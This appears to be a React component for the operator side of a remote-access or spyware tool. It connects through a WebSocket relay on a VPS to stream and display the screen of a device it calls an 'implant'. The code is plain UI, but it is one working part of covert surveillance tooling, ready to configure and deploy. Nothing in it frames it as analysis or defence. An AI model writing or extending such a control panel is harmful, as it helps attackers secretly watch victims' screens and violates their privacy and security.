import React, { useState, useEffect, useRef } from 'react';

// CRITICAL: Replace with the public IP address of your WebSocket relay server.
const WEBSOCKET_RELAY_IP = "YOUR_VPS_IP"; 

const LiveView = ({ deviceId }) => {
    const [isConnected, setIsConnected] = useState(false);
    const imageRef = useRef(null);

    useEffect(() => {
        if (!deviceId || WEBSOCKET_RELAY_IP === "YOUR_VPS_IP") {
            console.error("WebSocket relay IP is not configured.");
            return;
        }

        const ws = new WebSocket(`ws://${WEBSOCKET_RELAY_IP}:8080/stream/operator/${deviceId}`);

        ws.onopen = () => setIsConnected(true);
        ws.onclose = () => setIsConnected(false);
        ws.onerror = (err) => {
            console.error('WebSocket Error:', err);
            setIsConnected(false);
        };

        ws.onmessage = async (event) => {
            if (event.data instanceof Blob) {
                const url = URL.createObjectURL(event.data);
                if (imageRef.current) {
                    imageRef.current.src = url;
                }
            }
        };

        return () => ws.close();
    }, [deviceId]);

    return (
        <div style={{marginTop: '20px', padding: '10px', border: '1px solid #333'}}>
            <h3>Live Screen Monitor</h3>
            <p>Status: <span style={{color: isConnected ? 'green' : 'red', fontWeight: 'bold'}}>{isConnected ? 'CONNECTED' : 'DISCONNECTED'}</span></p>
            <div style={{ backgroundColor: '#000', border: '1px solid #555', minHeight: '400px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                <img ref={imageRef} alt="Live Stream" style={{ width: '100%', display: isConnected ? 'block' : 'none' }} onLoad={(e) => URL.revokeObjectURL(e.target.src)} />
                {!isConnected && <p style={{color: 'grey'}}>Awaiting connection from implant...</p>}
            </div>
        </div>
    );
};

export default LiveView;